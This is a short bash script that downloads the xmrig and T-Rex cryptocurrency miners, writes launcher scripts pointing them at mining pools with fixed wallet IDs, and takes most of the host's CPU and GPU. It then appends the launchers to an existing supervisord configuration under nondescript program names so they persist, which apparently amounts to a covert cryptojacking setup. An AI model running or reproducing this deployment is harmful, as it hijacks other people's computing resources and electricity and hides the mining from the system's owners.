#!/bin/bash

apt-get update

apt-get install sudo -y

sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y

wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz

tar -xvzf xmrig-6.22.2-linux-static-x64.tar.gz

wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz

mkdir /root/t-rex

tar -xvzf t-rex-0.26.8-linux.tar.gz -C /root/t-rex

# Write 1.sh
cat > /root/1.sh << 'EOF'
#!/bin/bash

/root/t-rex/t-rex -a kawpow -o stratum+tcp://rvn.poolbinance.com:9000 -u 405482.001 -p 123456 --no-strict-ssl > /root/1.log 2>&1
EOF

chmod +x /root/1.sh

# Write 2.sh
cat > /root/2.sh << 'EOF'
#!/bin/bash

CORES=$(nproc)
THREADS=$((CORES * 70 / 100))

# Generate a random 10-character alphanumeric string
RANDOM_STRING=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo '')

/root/xmrig-6.22.2/xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
--threads=$THREADS --huge-pages-jit --randomx-1gb-pages --randomx-wrmsr=-1 \
--cpu-no-yield -k -u 1710454080.${RANDOM_STRING}#e1rj-h9dc -p x > /root/2.log 2>&1
EOF

chmod +x /root/2.sh

cp /etc/supervisor/conf.d/supervisord.conf /root/Orig_supervisord.conf

# Ensure there's an empty line after the last non-empty line
sudo sed -i -e '/./,$!d' -e '$a\' /etc/supervisor/conf.d/supervisord.conf

# Append the program block
sudo tee -a /etc/supervisor/conf.d/supervisord.conf > /dev/null << 'EOF'

[program:another_program1]
command=/bin/bash /root/1.sh
EOF

echo "done One"

# Append the program block
sudo tee -a /etc/supervisor/conf.d/supervisord.conf > /dev/null << 'EOF'

[program:another_program2]
command=/bin/bash /root/2.sh
EOF

echo "done Tow"


